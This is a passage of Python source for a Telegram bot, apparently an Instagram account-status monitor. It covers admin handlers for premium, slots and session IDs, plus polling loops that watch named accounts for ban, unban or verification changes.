            if slot_count <= 0:
                await update.message.reply_text("❌ Slot count must be positive.")
                return
            db.cursor.execute("UPDATE users SET granted_slots=? WHERE user_id=?", (slot_count, target_id))
            db.conn.commit()
            await update.message.reply_text(f"✅ User {target_id} granted {slot_count} monitor slots.")
            try:
                await context.bot.send_message(target_id, f"🎉 You have been granted {slot_count} monitor slots!")
            except:
                pass
        except ValueError:
            await update.message.reply_text("❌ Invalid format. Use: <code>userid slot_count</code>", parse_mode="HTML")
        del user_states[user_id]
        keyboard = get_admin_keyboard()
        await update.message.reply_text("Admin Panel:", reply_markup=keyboard)
        return
    
    if action == "slot_remove":
        if user_id != ADMIN_USER_ID:
            await update.message.reply_text("⛔ Access denied.")
            del user_states[user_id]
            return
        try:
            target_id = int(text)
            db.cursor.execute("UPDATE users SET granted_slots=0 WHERE user_id=?", (target_id,))
            db.conn.commit()
            await update.message.reply_text(f"✅ Granted slots removed for user {target_id}.")
            try:
                await context.bot.send_message(target_id, "🔄 Your extra monitor slots have been removed.")
            except:
                pass
        except ValueError:
            await update.message.reply_text("❌ Invalid user ID.")
        del user_states[user_id]
        keyboard = get_admin_keyboard()
        await update.message.reply_text("Admin Panel:", reply_markup=keyboard)
        return
    
    if action == "add_session":
        parts = text.split(maxsplit=1)
        if len(parts) != 2:
            await update.message.reply_text("❌ Invalid format. Use: <code>username session_id</code>", parse_mode="HTML")
            del user_states[user_id]
            return
        ig_user, session_id = parts[0].strip(), parts[1].strip()
        success = await ig_pool.add_session(ig_user, session_id, user_id, context, 'user')
        if success:
            safe_ig = safe_html_escape(ig_user)
            await update.message.reply_text(f"✅ Session @{safe_ig} added successfully.")
        else:
            safe_ig = safe_html_escape(ig_user)
            await update.message.reply_text(f"❌ Failed to add @{safe_ig}. Invalid session ID.")
        del user_states[user_id]
        keyboard = get_session_management_keyboard()
        await update.message.reply_text("Session Management:", reply_markup=keyboard)
        return
    
    if action == "session_update":
        if user_id != ADMIN_USER_ID:
            await update.message.reply_text("⛔ Access denied.")
            del user_states[user_id]
            return
        ig_user = state.get("ig_user")
        if not ig_user:
            await update.message.reply_text("❌ Session error. Try again.")
            del user_states[user_id]
            return
        success = await ig_pool.update_session(ig_user, text, user_id, context)
        if success:
            safe_ig = safe_html_escape(ig_user)
            await update.message.reply_text(f"✅ Session ID updated for @{safe_ig}.")
        else:
            safe_ig = safe_html_escape(ig_user)
            await update.message.reply_text(f"❌ Failed to update session ID for @{safe_ig}.")
        del user_states[user_id]
        keyboard = get_session_management_keyboard()
        await update.message.reply_text("Session Management:", reply_markup=keyboard)
        return
    
    if action == "admin_session_select_update":
        if user_id != ADMIN_USER_ID:
            await update.message.reply_text("⛔ Access denied.")
            del user_states[user_id]
            return
        ig_user = text
        sessions = ig_pool.get_user_sessions(ADMIN_USER_ID, 'admin')
        if ig_user not in [s['instagram_username'] for s in sessions]:
            await update.message.reply_text("❌ Invalid admin session selected.")
            return
        user_states[user_id] = {"action": "admin_session_update", "ig_user": ig_user}
        await update.message.reply_text(
            f"📤 Send the new session ID for @{ig_user}\n\nSend /cancel to abort."
        )
        return
    
    if action == "admin_session_update":
        if user_id != ADMIN_USER_ID:
            await update.message.reply_text("⛔ Access denied.")
            del user_states[user_id]
            return
        ig_user = state.get("ig_user")
        if not ig_user:
            await update.message.reply_text("❌ Session error. Try again.")
            del user_states[user_id]
            return
        success = await ig_pool.update_session(ig_user, text, user_id, context)
        if success:
            await update.message.reply_text(f"✅ Admin session @{ig_user} updated.")
            rebalance_monitor_workers()
        else:
            await update.message.reply_text(f"❌ Failed to update admin session @{ig_user}.")
        del user_states[user_id]
        keyboard = get_admin_keyboard()
        await update.message.reply_text("Admin Panel:", reply_markup=keyboard)
        return
    
    if action == "admin_session_select_delete":
        if user_id != ADMIN_USER_ID:
            await update.message.reply_text("⛔ Access denied.")
            del user_states[user_id]
            return
        ig_user = text
        sessions = ig_pool.get_user_sessions(ADMIN_USER_ID, 'admin')
        if ig_user not in [s['instagram_username'] for s in sessions]:
            await update.message.reply_text("❌ Invalid admin session selected.")
            return
        keyboard = [
            [f"✅ Confirm Delete {ig_user}"],
            ["❌ Cancel"]
        ]
        user_states[user_id] = {"action": "admin_session_delete_confirm", "ig_user": ig_user}
        await update.message.reply_text(
            f"⚠️ Are you sure you want to delete admin session @{ig_user}?\n\nThis will affect premium users using this session.",
            reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        )
        return
    
    if action == "admin_session_delete_confirm":
        if user_id != ADMIN_USER_ID:
            await update.message.reply_text("⛔ Access denied.")
            del user_states[user_id]
            return
        if text.startswith("✅ Confirm Delete"):
            ig_user = state.get("ig_user")
            success = await ig_pool.delete_session(ig_user, ADMIN_USER_ID)
            if success:
                await update.message.reply_text(f"✅ Admin session @{ig_user} deleted.")
                rebalance_monitor_workers()
            else:
                await update.message.reply_text(f"❌ Failed to delete admin session @{ig_user}.")
        elif text == "❌ Cancel":
            await update.message.reply_text("❌ Deletion cancelled.")
        del user_states[user_id]
        keyboard = get_admin_keyboard()
        await update.message.reply_text("Admin Panel:", reply_markup=keyboard)
        return
    
    if action == "add_admin_session":
        if user_id != ADMIN_USER_ID:
            await update.message.reply_text("⛔ Access denied.")
            del user_states[user_id]
            return
        parts = text.split(maxsplit=1)
        if len(parts) != 2:
            await update.message.reply_text("❌ Invalid format. Use: <code>username session_id</code>", parse_mode="HTML")
            del user_states[user_id]
            return
        ig_user, session_id = parts[0].strip(), parts[1].strip()
        success = await ig_pool.add_session(ig_user, session_id, ADMIN_USER_ID, context, 'admin')
        if success:
            safe_ig = safe_html_escape(ig_user)
            await update.message.reply_text(f"✅ Admin session @{safe_ig} added successfully.")
            rebalance_monitor_workers()
        else:
            safe_ig = safe_html_escape(ig_user)
            await update.message.reply_text(f"❌ Failed to add admin session @{safe_ig}.")
        del user_states[user_id]
        keyboard = get_admin_keyboard()
        await update.message.reply_text("Admin Panel:", reply_markup=keyboard)
        return
    
    if action == "premium_menu":
        if text == "➕ Add Premium":
            user_states[user_id] = {"action": "premium_add"}
            await update.message.reply_text(
                "📝 Send user ID, days, accounts in format:\n<code>userid days accounts</code>\n\n"
                "Example: <code>123456789 30 5</code>\n\nSend /cancel to abort.",
                parse_mode="HTML"
            )
        elif text == "➖ Remove Premium":
            user_states[user_id] = {"action": "premium_remove"}
            await update.message.reply_text(
                "📝 Send user ID to remove premium:\n\nExample: <code>123456789</code>\n\nSend /cancel to abort.",
                parse_mode="HTML"
            )
        elif text == "🏠 Main Menu":
            del user_states[user_id]
            user = get_user(user_id)
            first_name = user['first_name'] if user else "User"
            welcome_text = format_welcome(user_id, first_name)
            keyboard = get_main_keyboard(user_id)
            await update.message.reply_text(welcome_text, reply_markup=keyboard, parse_mode="HTML")
        return
    
    if action == "premium_add":
        if user_id != ADMIN_USER_ID:
            await update.message.reply_text("⛔ Access denied.")
            del user_states[user_id]
            return
        parts = text.split()
        if len(parts) != 3:
            await update.message.reply_text("❌ Invalid format. Use: <code>userid days accounts</code>", parse_mode="HTML")
            return
        try:
            target_id = int(parts[0])
            days = int(parts[1])
            accounts = int(parts[2])
            if days <= 0 or accounts <= 0:
                raise ValueError("Days and accounts must be positive")
            expiry = int(time.time()) + (days * 86400)
            db.cursor.execute(
                "UPDATE users SET is_premium=1, premium_expiry=?, max_accounts=? WHERE user_id=?",
                (expiry, accounts, target_id)
            )
            db.conn.commit()
            await update.message.reply_text(f"✅ User {target_id} is now premium for {days} days with {accounts} accounts.")
            try:
                await context.bot.send_message(
                    target_id,
                    f"🎉 You've been upgraded to Premium for {days} days with {accounts} monitor slots!"
                )
            except:
                pass
        except ValueError as e:
            await update.message.reply_text(f"❌ {str(e)}")
        except Exception as e:
            logger.error(f"Premium add error: {e}")
            await update.message.reply_text("❌ Error adding premium. Check logs.")
        del user_states[user_id]
        keyboard = get_admin_keyboard()
        await update.message.reply_text("Admin Panel:", reply_markup=keyboard)
        return
    
    if action == "premium_remove":
        if user_id != ADMIN_USER_ID:
            await update.message.reply_text("⛔ Access denied.")
            del user_states[user_id]
            return
        try:
            target_id = int(text)
            db.cursor.execute(
                "UPDATE users SET is_premium=0, premium_expiry=0 WHERE user_id=?",
                (target_id,)
            )
            db.conn.commit()
            stop_user_monitors(target_id)
            cleanup_user_tasks(target_id)
            db.cursor.execute(
                "UPDATE monitors SET status='stopped' WHERE user_id=? AND status='active'",
                (target_id,)
            )
            db.conn.commit()
            await update.message.reply_text(f"✅ User {target_id} premium removed. All monitors stopped.")
            try:
                await context.bot.send_message(target_id, "⛔ Your premium access has been removed. Monitors stopped.")
            except:
                pass
        except ValueError:
            await update.message.reply_text("❌ Invalid user ID.")
        except Exception as e:
            logger.error(f"Premium remove error: {e}")
            await update.message.reply_text("❌ Error removing premium. Check logs.")
        del user_states[user_id]
        keyboard = get_admin_keyboard()
        await update.message.reply_text("Admin Panel:", reply_markup=keyboard)
        return
    
    if action == "broadcast":
        if user_id != ADMIN_USER_ID:
            await update.message.reply_text("⛔ Access denied.")
            del user_states[user_id]
            return
        db.cursor.execute("SELECT user_id FROM users")
        users = db.cursor.fetchall()
        total = len(users)
        delivered = 0
        failed = 0
        
        await update.message.reply_text(f"📢 Broadcasting to {total} users...")
        
        for user_row in users:
            try:
                await context.bot.send_message(user_row['user_id'], text, parse_mode="HTML")
                delivered += 1
                await asyncio.sleep(0.05)
            except Exception as e:
                failed += 1
                logger.warning(f"Broadcast failed for {user_row['user_id']}: {e}")
        
        result_text = (
            f"📢 <b>Broadcast Completed</b>\n{SEPARATOR}\n"
            f"👥 Total Users: {total}\n"
            f"✅ Delivered: {delivered}\n"
            f"❌ Failed: {failed}\n\n— @rejerks | WLZBI"
        )
        await update.message.reply_text(result_text, parse_mode="HTML")
        del user_states[user_id]
        keyboard = get_admin_keyboard()
        await update.message.reply_text("Admin Panel:", reply_markup=keyboard)
        return
    
    if action in ["verification", "ban", "unban"]:
        ig_username = text.strip()
        valid, result = validate_ig_username(ig_username)
        if not valid:
            await update.message.reply_text(f"⚠️ Invalid Username Format\n\n{result}\n\nExample: my_username")
            del user_states[user_id]
            return
        ig_username = result
        
        monitor_id = get_pending_monitor(user_id, ig_username, action)
        if monitor_id:
            safe_ig = safe_html_escape(ig_username)
            await update.message.reply_text(f"⏳ You already have a pending request for @{safe_ig}.")
            del user_states[user_id]
            return
        
        selected_session = state.get("selected_session")
        session_record = None
        
        if not selected_session:
            sessions = ig_pool.get_user_owned_sessions_only(user_id)
            if not sessions:
                await update.message.reply_text(
                    "❌ You don't have any valid user sessions.\n\n"
                    "Please add a session using 'My Sessions' -> 'Add Session' first."
                )
                del user_states[user_id]
                return
            selected_session = sessions[0]
        
        session_record = ig_pool.get_session_by_username_strict_user(selected_session, user_id)
        if not session_record:
            await update.message.reply_text(
                f"❌ Session @{selected_session} not found or invalid.\n"
                f"Please update or add your own session."
            )
            del user_states[user_id]
            return
        
        try:
            client = await ig_pool.get_client(selected_session, context, user_id, strict_user_session=True)
            
            if not client:
                await update.message.reply_text(
                    f"❌ Cannot access Instagram API with your session @{selected_session}.\n"
                    f"Please update or add a new session using 'My Sessions'."
                )
                del user_states[user_id]
                return
            
            if action == "ban":
                try:
                    state, info, error_detail = await classify_account_state(client, ig_username)
                    account_found = (state == "ACCOUNT_EXISTS" or state == "VERIFIED")
                except Exception as e:
                    logger.error(f"Ban lookup error for @{ig_username}: {e}")
                    account_found = False
                    info = None
                
                if account_found and info:
                    info_obj = info
                    ban_info = json.dumps({
                        "username": info_obj.username,
                        "full_name": info_obj.full_name or "N/A",
                        "follower_count": info_obj.follower_count,
                        "following_count": info_obj.following_count,
                        "media_count": info_obj.media_count,
                        "is_private": info_obj.is_private,
                        "is_verified": info_obj.is_verified,
                        "biography": info_obj.biography or "N/A"
                    })
                    safe_username = safe_html_escape(ig_username)
                    safe_name = safe_html_escape(info_obj.full_name or "N/A")
                    safe_bio = safe_html_escape(info_obj.biography or "N/A")
                    info_text = (
                        f"👤 <b>Account Info</b>\n{SEPARATOR}\n"
                        f"Username: @{safe_username}\n"
                        f"Name: {safe_name}\n"
                        f"👥 Followers: {info_obj.follower_count}\n"
                        f"📌 Following: {info_obj.following_count}\n"
                        f"📷 Posts: {info_obj.media_count}\n"
                        f"🔒 Private: {'Yes' if info_obj.is_private else 'No'}\n"
                        f"✅ Verified: {'Yes' if info_obj.is_verified else 'No'}\n"
                        f"📝 Bio: {safe_bio}"
                    )
                    db.cursor.execute(
                        """INSERT INTO monitors 
                           (user_id, ig_username, monitor_type, start_time, status, ban_info, assigned_worker, assigned_session_id, initial_state, last_state, first_check_completed) 
                           VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                        (user_id, ig_username, action, int(time.time()), "pending", ban_info, selected_session, 
                         session_record['id'] if session_record else None, "AVAILABLE", "AVAILABLE", 1)
                    )
                    db.conn.commit()
                    new_monitor_id = db.cursor.lastrowid
                    keyboard = [
                        [InlineKeyboardButton("✅ Confirm", callback_data=f"confirm_{new_monitor_id}")],
                        [InlineKeyboardButton("❌ Deny", callback_data=f"deny_{new_monitor_id}")]
                    ]
                    reply_markup = InlineKeyboardMarkup(keyboard)
                    await update.message.reply_text(info_text, reply_markup=reply_markup, parse_mode="HTML")
                    del user_states[user_id]
                    return
                else:
                    safe_ig = safe_html_escape(ig_username)
                    await update.message.reply_text(
                        f"❌ <b>User Not Found</b>\n\n"
                        f"👤 Username: @{safe_ig}\n\n"
                        f"Try different username or recheck the username again.",
                        parse_mode="HTML"
                    )
                    del user_states[user_id]
                    return
            
            elif action == "unban":
                try:
                    state, info, error_detail = await classify_account_state(client, ig_username)
                    account_found = (state == "ACCOUNT_EXISTS" or state == "VERIFIED")
                except Exception as e:
                    logger.error(f"Unban lookup error for @{ig_username}: {e}")
                    account_found = False
                    info = None
                
                if account_found and info:
                    safe_ig = safe_html_escape(ig_username)
                    safe_name = safe_html_escape(info.full_name or "N/A")
                    safe_bio = safe_html_escape(info.biography or "N/A")
                    await update.message.reply_text(
                        f"⚠️ <b>Account Already Unbanned</b>\n\n"
                        f"👤 Username: @{safe_ig}\n"
                        f"📛 Name: {safe_name}\n"
                        f"👥 Followers: {info.follower_count}\n"
                        f"📌 Following: {info.following_count}\n"
                        f"📷 Posts: {info.media_count}\n"
                        f"🔒 Private: {'Yes' if info.is_private else 'No'}\n"
                        f"✅ Verified: {'Yes' if info.is_verified else 'No'}\n"
                        f"📝 Bio: {safe_bio}\n\n"
                        f"This account is already available on Instagram.\n\n"
                        f"Try different username or recheck the username.",
                        parse_mode="HTML"
                    )
                    del user_states[user_id]
                    return
                else:
                    safe_ig = safe_html_escape(ig_username)
                    info_text = (
                        f"🚫 <b>Account Currently Banned</b>\n\n"
                        f"👤 <b>Username:</b> @{safe_ig}\n"
                        f"🔒 <b>Status:</b> Unavailable on Instagram\n\n"
                        f"📡 Click <b>Confirm</b> to start monitoring.\n"
                        f"⏱️ Checks every {get_user_monitor_interval(user_id)}s until the account is available again."
                    )
                    ban_info = json.dumps({"username": ig_username, "status": "unavailable"})
                    db.cursor.execute(
                        """INSERT INTO monitors 
                           (user_id, ig_username, monitor_type, start_time, status, ban_info, assigned_worker, assigned_session_id, initial_state, last_state, first_check_completed) 
                           VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                        (user_id, ig_username, action, int(time.time()), "pending", ban_info, selected_session,
                         session_record['id'] if session_record else None, "UNAVAILABLE", "UNAVAILABLE", 1)
                    )
                    db.conn.commit()
                    new_monitor_id = db.cursor.lastrowid
                    keyboard = [
                        [InlineKeyboardButton("✅ Confirm", callback_data=f"confirm_{new_monitor_id}")],
                        [InlineKeyboardButton("❌ Deny", callback_data=f"deny_{new_monitor_id}")]
                    ]
                    reply_markup = InlineKeyboardMarkup(keyboard)
                    await update.message.reply_text(info_text, reply_markup=reply_markup, parse_mode="HTML")
                    del user_states[user_id]
                    return
            
            elif action == "verification":
                try:
                    state, info, error_detail = await classify_account_state(client, ig_username)
                except Exception as e:
                    logger.error(f"Verification lookup error for @{ig_username}: {e}")
                    safe_ig = safe_html_escape(ig_username)
                    await update.message.reply_text(
                        f"⚠️ Instagram Check Unavailable\n\n👤 Username: @{safe_ig}\n\nInstagram could not be checked right now.\n\nPlease try again shortly."
                    )
                    del user_states[user_id]
                    return
                
                if state == "ACCOUNT_NOT_FOUND":
                    safe_ig = safe_html_escape(ig_username)
                    await update.message.reply_text(
                        f"❌ Account Not Found\n\n👤 Username: @{safe_ig}\n\nThe account could not be found on Instagram.\n\nPlease recheck the username and try again."
                    )
                    del user_states[user_id]
                    return
                elif state == "VERIFIED":
                    safe_ig = safe_html_escape(ig_username)
                    safe_name = safe_html_escape(info.full_name or "N/A")
                    safe_bio = safe_html_escape(info.biography or "N/A")
                    await update.message.reply_text(
                        f"ℹ️ Account Already Verified\n\n👤 Username: @{safe_ig}\n📛 Name: {safe_name}\n✅ Verified: Yes\n📝 Bio: {safe_bio}\n\nThis account is already verified on Instagram.\n\nNo verification monitor is required."
                    )
                    del user_states[user_id]
                    return
                elif state == "ACCOUNT_EXISTS":
                    safe_ig = safe_html_escape(ig_username)
                    safe_name = safe_html_escape(info.full_name or "N/A")
                    safe_bio = safe_html_escape(info.biography or "N/A")
                    info_text = (
                        f"👤 <b>Account Info</b>\n{SEPARATOR}\n"
                        f"Username: @{safe_ig}\n"
                        f"Name: {safe_name}\n"
                        f"👥 Followers: {info.follower_count}\n"
                        f"📌 Following: {info.following_count}\n"
                        f"📷 Posts: {info.media_count}\n"
                        f"🔒 Private: {'Yes' if info.is_private else 'No'}\n"
                        f"✅ Verified: {'No'}\n"
                        f"📝 Bio: {safe_bio}"
                    )
                    ban_info = json.dumps({
                        "username": info.username,
                        "full_name": info.full_name or "N/A",
                        "follower_count": info.follower_count,
                        "following_count": info.following_count,
                        "media_count": info.media_count,
                        "is_private": info.is_private,
                        "is_verified": info.is_verified,
                        "biography": info.biography or "N/A"
                    })
                    db.cursor.execute(
                        """INSERT INTO monitors 
                           (user_id, ig_username, monitor_type, start_time, status, ban_info, assigned_worker, assigned_session_id, initial_state, last_state, first_check_completed) 
                           VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                        (user_id, ig_username, action, int(time.time()), "pending", ban_info, selected_session,
                         session_record['id'] if session_record else None, "NOT_VERIFIED", "NOT_VERIFIED", 1)
                    )
                    db.conn.commit()
                    new_monitor_id = db.cursor.lastrowid
                    keyboard = [
                        [InlineKeyboardButton("✅ Confirm", callback_data=f"confirm_{new_monitor_id}")],
                        [InlineKeyboardButton("❌ Deny", callback_data=f"deny_{new_monitor_id}")]
                    ]
                    reply_markup = InlineKeyboardMarkup(keyboard)
                    await update.message.reply_text(info_text, reply_markup=reply_markup, parse_mode="HTML")
                    del user_states[user_id]
                    return
                else:
                    safe_ig = safe_html_escape(ig_username)
                    await update.message.reply_text(f"⚠️ Instagram Check Unavailable\n\n👤 Username: @{safe_ig}\n\nInstagram could not be checked right now.\n\nPlease try again shortly.")
                    del user_states[user_id]
                    return
        
        except Exception as e:
            logger.error(f"Error in monitor setup: {e}")
            await update.message.reply_text("⚠️ An error occurred while setting up the monitor. Please try again later.")
            del user_states[user_id]
            return

async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    data = query.data
    
    if data.startswith("confirm_"):
        try:
            monitor_id = int(data.split("_")[1])
        except (IndexError, ValueError):
            await query.edit_message_text("❌ Invalid callback data.")
            return
        
        db.cursor.execute(
            "SELECT user_id, ig_username, monitor_type, status, assigned_worker, initial_state FROM monitors WHERE id=?",
            (monitor_id,)
        )
        row = db.cursor.fetchone()
        if not row:
            await query.edit_message_text("❌ Monitor not found.")
            return
        if row['user_id'] != user_id:
            await query.edit_message_text("⛔ Not your monitor.")
            return
        if row['status'] != 'pending':
            await query.edit_message_text(f"⏳ This monitor is already {row['status']}.")
            return
        
        if monitor_id in monitor_tasks and not monitor_tasks[monitor_id].done():
            await query.edit_message_text("ℹ️ Monitor Already Active")
            return
        
        assigned_worker = get_least_loaded_user_session_for_user(user_id)
        
        if not assigned_worker:
            await query.edit_message_text("❌ No user session available. Please add or update your session.")
            return
        
        db.cursor.execute(
            "UPDATE monitors SET status='active', start_time=?, assigned_worker=? WHERE id=?",
            (int(time.time()), assigned_worker, monitor_id)
        )
        db.conn.commit()
        
        safe_ig = safe_html_escape(row['ig_username'])
        confirm_text = (
            f"✅ Monitoring started for @{safe_ig} ({row['monitor_type']}).\n"
            f"⏱️ Checking every {get_user_monitor_interval(user_id)} seconds.\n\n— @rejerks | WLZBI"
        )
        await query.edit_message_text(confirm_text)
        
        task = asyncio.create_task(monitor_loop(user_id, monitor_id, context))
        monitor_tasks[monitor_id] = task
        task.add_done_callback(lambda t, mid=monitor_id: cleanup_monitor_task(mid))
        return
    
    if data.startswith("deny_"):
        try:
            monitor_id = int(data.split("_")[1])
        except (IndexError, ValueError):
            await query.edit_message_text("❌ Invalid callback data.")
            return
        
        db.cursor.execute("SELECT user_id, status FROM monitors WHERE id=?", (monitor_id,))
        row = db.cursor.fetchone()
        if row and row['user_id'] == user_id and row['status'] == 'pending':
            db.cursor.execute("DELETE FROM monitors WHERE id=?", (monitor_id,))
            db.conn.commit()
            await query.edit_message_text("❌ Monitor cancelled.\n\n— @rejerks | WLZBI")
        else:
            await query.edit_message_text("❌ Cannot cancel this monitor.")
        return

def cleanup_monitor_task(monitor_id: int):
    task = monitor_tasks.pop(monitor_id, None)
    if task and not task.done():
        task.cancel()

async def monitor_loop(user_id: int, monitor_id: int, context: ContextTypes.DEFAULT_TYPE):
    db.cursor.execute(
        "SELECT ig_username, monitor_type, ban_info, start_time, assigned_worker, assigned_session_id, initial_state, last_state, first_check_completed FROM monitors WHERE id=?",
        (monitor_id,)
    )
    row = db.cursor.fetchone()
    if not row:
        logger.info(f"Monitor {monitor_id} already deleted, stopping loop")
        return
    
    ig_username, m_type = row['ig_username'], row['monitor_type']
    start_time = int(time.time())
    retry_count = 0
    ban_info = json.loads(row['ban_info']) if row['ban_info'] else {}
    initial_state = row['initial_state'] or "UNKNOWN"
    last_state = row['last_state'] or initial_state
    assigned_worker = row['assigned_worker']
    
    disabled_consecutive_count = 0
    REQUIRED_DISABLED_CHECKS = 3
    monitor_start_time = start_time
    monitor_interval = get_user_monitor_interval(user_id)
    
    while not shutdown_event.is_set():
        try:
            db.cursor.execute("SELECT status FROM monitors WHERE id=?", (monitor_id,))
            status_row = db.cursor.fetchone()
            if not status_row or status_row['status'] in ['stopped', 'completed', 'failed', 'deleted']:
                logger.info(f"Monitor {monitor_id} status changed to {status_row['status'] if status_row else 'deleted'}")
                break
            
            if not is_premium(user_id):
                try:
                    chat = await asyncio.wait_for(
                        context.bot.get_chat(user_id),
                        timeout=CONNECT_TIMEOUT
                    )
                    if REQUIRED_TAG not in (chat.bio or ""):
                        logger.info(f"User {user_id} removed tag, stopping monitor {monitor_id}")
                        try:
                            await context.bot.send_message(
                                user_id,
                                f"⛔ Missing <code>{REQUIRED_TAG}</code> in bio. Monitor stopped.",
                                parse_mode="HTML"
                            )
                        except:
                            pass
                        db.cursor.execute("UPDATE monitors SET status='stopped' WHERE id=?", (monitor_id,))
                        db.conn.commit()
                        break
                except (TimedOut, asyncio.TimeoutError):
                    logger.warning(f"Bio check timeout in monitor {monitor_id}")
                    await asyncio.sleep(60)
                    continue
            
            if not assigned_worker:
                assigned_worker = get_least_loaded_user_session_for_user(user_id)
                if assigned_worker:
                    db.cursor.execute("UPDATE monitors SET assigned_worker=? WHERE id=?", (assigned_worker, monitor_id))
                    db.conn.commit()
                else:
                    logger.error(f"No worker available for monitor {monitor_id}")
                    await asyncio.sleep(30)
                    continue
            
            client = await ig_pool.get_client(assigned_worker, context, user_id, strict_user_session=True)
            
            if not client:
                logger.warning(f"Worker {assigned_worker} unavailable")
                await ig_pool.set_session_status(assigned_worker, 'expired')
                await context.bot.send_message(
                    user_id,
                    f"⚠️ Your session @{assigned_worker} has expired. Please update it."
                )
                db.cursor.execute("UPDATE monitors SET status='stopped' WHERE id=?", (monitor_id,))
                db.conn.commit()
                break
            
            if m_type == "ban":
                try:
                    state, info, error_detail = await classify_account_state(client, ig_username)
                except Exception as e:
                    logger.error(f"Ban monitor check error for @{ig_username}: {e}")
                    retry_count += 1
                    if retry_count >= MAX_RETRIES:
                        logger.error(f"Too many errors for @{ig_username}, monitor failed")
                        db.cursor.execute("UPDATE monitors SET status='failed' WHERE id=?", (monitor_id,))
                        db.conn.commit()
                        break
                    await asyncio.sleep(RETRY_BACKOFF * retry_count)
                    continue
                
                if state == "RATE_LIMITED":
                    logger.warning(f"Rate limit for @{ig_username}, backing off")
                    await asyncio.sleep(monitor_interval * 2)
                    continue
                
                if state == "TIMEOUT" or state == "UNKNOWN_ERROR":
                    retry_count += 1
                    if retry_count >= MAX_RETRIES:
                        logger.error(f"Too many errors for @{ig_username}, monitor failed")
                        db.cursor.execute("UPDATE monitors SET status='failed' WHERE id=?", (monitor_id,))
                        db.conn.commit()
                        break
                    await asyncio.sleep(RETRY_BACKOFF * retry_count)
                    continue
                
                retry_count = 0
                
                if state == "ACCOUNT_EXISTS" or state == "VERIFIED":
                    last_state = "AVAILABLE"
                    db.cursor.execute("UPDATE monitors SET last_state=? WHERE id=?", (last_state, monitor_id))
                    db.conn.commit()
                    disabled_consecutive_count = 0
                    
                elif state == "ACCOUNT_NOT_FOUND":
                    disabled_consecutive_count += 1
                    logger.info(f"@ {ig_username} disabled state detected ({disabled_consecutive_count}/{REQUIRED_DISABLED_CHECKS})")
                    
                    if disabled_consecutive_count >= REQUIRED_DISABLED_CHECKS and last_state == "AVAILABLE":
                        elapsed = int(time.time()) - monitor_start_time
                        await send_completion_message(user_id, context, "banned", None, elapsed, ig_username, ban_info)
                        db.cursor.execute("UPDATE monitors SET status='completed', result_data=? WHERE id=?", 
                                        (json.dumps({"banned": True, "time": elapsed}), monitor_id))
                        db.conn.commit()
                        logger.info(f"Ban confirmed for @{ig_username} after {elapsed}s and {disabled_consecutive_count} checks")
                        break
                    elif disabled_consecutive_count >= REQUIRED_DISABLED_CHECKS and last_state != "AVAILABLE":
                        logger.warning(f"Account @{ig_username} appears disabled from the start. Not triggering ban.")
                        disabled_consecutive_count = 0
                    
            elif m_type == "unban":
                try:
                    state, info, error_detail = await classify_account_state(client, ig_username)
                except Exception as e:
                    logger.error(f"Unban monitor check error for @{ig_username}: {e}")
                    retry_count += 1
                    if retry_count >= MAX_RETRIES:
                        logger.error(f"Too many errors for @{ig_username}, monitor failed")
                        db.cursor.execute("UPDATE monitors SET status='failed' WHERE id=?", (monitor_id,))
                        db.conn.commit()
                        break
                    await asyncio.sleep(RETRY_BACKOFF * retry_count)
                    continue
                
                if state == "RATE_LIMITED":
                    await asyncio.sleep(monitor_interval * 2)
                    continue
                
                if state == "TIMEOUT" or state == "UNKNOWN_ERROR":
                    retry_count += 1
                    if retry_count >= MAX_RETRIES:
                        logger.error(f"Too many errors for @{ig_username}, monitor failed")
                        db.cursor.execute("UPDATE monitors SET status='failed' WHERE id=?", (monitor_id,))
                        db.conn.commit()
                        break
                    await asyncio.sleep(RETRY_BACKOFF * retry_count)
                    continue
                
                retry_count = 0
                
                if state == "ACCOUNT_EXISTS" or state == "VERIFIED":
                    if last_state == "UNAVAILABLE":
                        elapsed = int(time.time()) - monitor_start_time
                        fresh_info = None
                        try:
                            fresh_state, fresh_info, fresh_error = await classify_account_state(client, ig_username)
                            if fresh_state == "ACCOUNT_EXISTS" or fresh_state == "VERIFIED":
                                fresh_info = fresh_info
                        except Exception as e:
                            logger.error(f"Failed to fetch fresh info for @{ig_username}: {e}")
                            await asyncio.sleep(5)
                            continue
                        if fresh_info:
                            await send_completion_message(user_id, context, "unbanned", fresh_info, elapsed, ig_username)
                            db.cursor.execute("UPDATE monitors SET status='completed', result_data=? WHERE id=?", 
                                            (json.dumps({"unbanned": True, "time": elapsed, "info": {
                                                "username": fresh_info.username,
                                                "full_name": fresh_info.full_name or "N/A",
                                                "follower_count": fresh_info.follower_count,
                                                "following_count": fresh_info.following_count,
                                                "media_count": fresh_info.media_count,
                                                "is_private": fresh_info.is_private,
                                                "is_verified": fresh_info.is_verified,
                                                "biography": fresh_info.biography or "N/A"
                                            }}), monitor_id))
                            db.conn.commit()
                            logger.info(f"Unban detected for @{ig_username} after {elapsed}s")
                            break
                    last_state = "AVAILABLE"
                    db.cursor.execute("UPDATE monitors SET last_state=? WHERE id=?", (last_state, monitor_id))
                    db.conn.commit()
                    
                elif state == "ACCOUNT_NOT_FOUND":
                    last_state = "UNAVAILABLE"
                    db.cursor.execute("UPDATE monitors SET last_state=? WHERE id=?", (last_state, monitor_id))
                    db.conn.commit()
            
            elif m_type == "verification":
                try:
                    state, info, error_detail = await classify_account_state(client, ig_username)
                except Exception as e:
                    logger.error(f"Verification monitor check error for @{ig_username}: {e}")
                    retry_count += 1
                    if retry_count >= MAX_RETRIES:
                        logger.error(f"Too many errors for @{ig_username}, monitor failed")
                        db.cursor.execute("UPDATE monitors SET status='failed' WHERE id=?", (monitor_id,))
                        db.conn.commit()
                        break
                    await asyncio.sleep(RETRY_BACKOFF * retry_count)
                    continue
                
                if state == "RATE_LIMITED":
                    await asyncio.sleep(monitor_interval * 2)
                    continue
                
                if state == "TIMEOUT" or state == "UNKNOWN_ERROR":
                    retry_count += 1
                    if retry_count >= MAX_RETRIES:
                        logger.error(f"Too many errors for @{ig_username}, monitor failed")
                        db.cursor.execute("UPDATE monitors SET status='failed' WHERE id=?", (monitor_id,))
                        db.conn.commit()
                        break
                    await asyncio.sleep(RETRY_BACKOFF * retry_count)
                    continue
